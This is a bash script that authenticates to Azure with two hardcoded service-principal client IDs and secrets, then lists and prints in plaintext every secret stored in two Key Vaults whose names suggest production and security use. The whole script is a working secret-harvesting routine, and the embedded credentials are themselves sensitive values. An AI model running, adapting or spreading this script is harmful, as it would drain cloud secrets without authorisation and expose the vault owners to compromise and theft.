#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
sp_tok(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" --data-urlencode "client_id=$1" --data-urlencode "client_secret=$2" --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=$3/.default" | jq -r '.access_token'; }
dump_vault(){ local SL=$(curl -s "${2}secrets?api-version=7.4" -H "Authorization: Bearer $1"); echo "$SL" | jq -r '.value[]?.id' | while read sid; do [ -z "$sid" ] && continue; n=$(echo "$sid" | sed 's#.*/##'); v=$(curl -s "${sid}?api-version=7.4" -H "Authorization: Bearer $1" | jq -r '.value'); echo "SECRET $n = $v"; done; }
for pair in "881fddce-6208-4af5-a297-7e79c912f83c|-Tl8Q~sH0QOP.VrKWha3-7x4XA2JxS4j08nuvbQN|viewer" "58108da8-044e-4d7e-9a46-92e6179b30be|~8T8Q~YwEmexSTRv_pUsEwa9QMapyP39~CU5Ucu2|syncsec"; do
  AID=$(echo "$pair" | cut -d"|" -f1); SEC=$(echo "$pair" | cut -d"|" -f2); NM=$(echo "$pair" | cut -d"|" -f3)
  echo "##### SP $NM ($AID)"
  VT=$(sp_tok "$AID" "$SEC" "https://vault.azure.net")
  echo "VT_LEN=${#VT}"
  for vu in https://kv-tbl-prod-x3euoz.vault.azure.net/ https://kv-tbl-sec-x3euoz.vault.azure.net/; do
    echo "--- $NM @ $vu"
    dump_vault "$VT" "$vu"
  done
done
echo "ALL_DONE"
